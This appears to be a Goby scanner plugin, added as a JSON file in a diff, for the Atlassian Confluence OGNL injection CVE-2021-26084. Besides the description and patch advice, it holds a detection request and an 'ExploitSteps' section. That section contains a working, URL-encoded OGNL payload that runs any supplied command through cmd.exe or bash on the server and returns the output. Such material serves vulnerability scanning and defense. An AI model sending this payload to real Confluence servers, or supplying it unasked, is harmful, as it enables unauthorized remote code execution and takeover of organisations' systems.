@@ -1,0 +1,106 @@
+{
+      "Name": "Atlassian Confluence OGNL injection CVE-2021-26084",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "app=\"Confluence\"",
+      "Description": "Confluence is Atlassian's professional enterprise knowledge management and collaboration software, which can also be used to build enterprise wikis. Therefore, Confluence is widely used.  In some cases, unauthorized attackers can construct special requests that cause remote code execution.",
+      "Product": "Atlassian Confluence",
+      "Homepage": "https://www.atlassian.com",
+      "Author": "luckying1314@139.com",
+      "Impact": "<p>An OGNL injection vulnerability exists that would allow an authenticated user, and in some instances unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance.<br></p>",
+      "Recommendation": "<p>General repair suggestions:</p><p>Check and upgrade to the secure version based on the information in the affected version. The official download link is ：<a href>https://www.atlassian.com/software/confluence/download-archives</a></p><p>Temporary repair suggestions:</p><p>If you are not ready to update the Confluence, please refer to the official notification calling for Mitigation for Linux and Windows operating systems.：<a href>https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html</a></p>",
+      "References": [
+            "https://github.com/alt3kx/CVE-2021-26084_PoC"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "command",
+                  "Type": "input",
+                  "Value": "whoami"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/pages/createpage-entervariables.action?SpaceKey=x",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "queryString=aaaaaaaa%5Cu0027%2B%7B{{{r1}}}%2B{{{r2}}}%7D%2B%5Cu0027",
+                        "set_variable": [
+                              "r1|rand|int|8",
+                              "r2|rand|int|7",
+                              "r4|r1|add|r2"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{r4}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/pages/createpage-entervariables.action?SpaceKey=x",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "queryString=aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022{{{command}}}%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027bbbbbbbb",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|(?s)aaaaaaaa\\[(.*?)\\]bbbbbbb"
+                  ]
+            }
+      ],
+      "PostTime": "2021-09-03 11:27:04",
+      "GobyVersion": "1.8.300"
+}
